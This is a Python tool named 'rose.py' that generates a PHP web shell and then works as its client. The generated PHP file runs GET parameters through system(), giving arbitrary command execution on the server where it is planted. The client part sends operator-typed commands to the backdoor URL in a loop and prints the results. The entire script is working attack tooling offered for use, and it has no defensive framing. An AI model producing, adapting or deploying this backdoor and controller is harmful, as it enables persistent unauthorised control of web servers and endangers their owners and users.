import urllib.request
from bs4 import BeautifulSoup
from optparse import OptionParser
import time

parse = OptionParser(
"""

                                              
              ,----..                         
,-.----.     /   /   \   .--.--.       ,---,. 
\    /  \   /   .     : /  /    '.   ,'  .' | 
;   :    \ .   /   ;.  \  :  /`. / ,---.'   | 
|   | .\ :.   ;   /  ` ;  |  |--`  |   |   .' 
.   : |: |;   |  ; \ ; |  :  ;_    :   :  |-, 
|   |  \ :|   :  | ; | '\  \    `. :   |  ;/| 
|   : .  /.   |  ' ' ' : `----.   \|   :   .' 
;   | |  \'   ;  \; /  | __ \  \  ||   |  |-, 
|   | ;\  \\   \  ',  / /  /`--'  /'   :  ;/| 
:   ' | \.' ;   :    / '--'.     / |   |    \ 
:   : :-'    \   \ .'    `--'---'  |   :   .' 
|   |.'       `---`                |   | ,'   
`---'                              `----'     
                                              
rose.py [options]
-u /--url : shell url 
-g /--generate : shell name 
-----------
ex :
rose.py -u 127.0.0.1/backdoor.php 
rose.py -g backdoor.php

""")

parse.add_option("-u","--url",dest="url",type="string",help="plz enter url")
parse.add_option("-g","--gen",dest="generate",type="string",help="plz enter shell name")
(options,args) = parse.parse_args()
if options.url == None and options.generate ==None :
    print(parse.usage)
    exit(0)
else :
    if options.generate != None and options.url ==None :
        shell_name = str(options.generate)
        shell = shell_name+".php"
        opfile = open(shell,"w+")
        code_php ="""
        <?php 
        $array = array();
        foreach ($_GET as $value)
        { $event = $value;
          array_push ($array,$event);
        }
        echo (system($array[0]." ".$array[1]." ".$array[2]." ".$array[3].$array[4]." ".$array[5]." ".$array[6]));
        print_r($array);
        ?>
        
        """
        opfile.write(code_php)
        opfile.close()
        print ("shell is generated")
    if options.url != None and options.generate ==None :
        url = str(options.url)
        print ("""
        ex  >> [command] space var=[command]
        real ex >> ipconfig f=> d=ipconfig.txt
        do not use vsr c 
        exit to close shell        
        
               """)
        while True :
            command = str(input("<shell   >"))
            if command == "exit":
                break;
            openurl = urllib.request.urlopen(url+"?c={0}".format(command))
            print (url+"?c={0}".format(command))
            content = str(openurl.read().decode("utf-8")).rstrip("\n")
            soup = BeautifulSoup(content,"html.parser")
            print (soup.get_text())
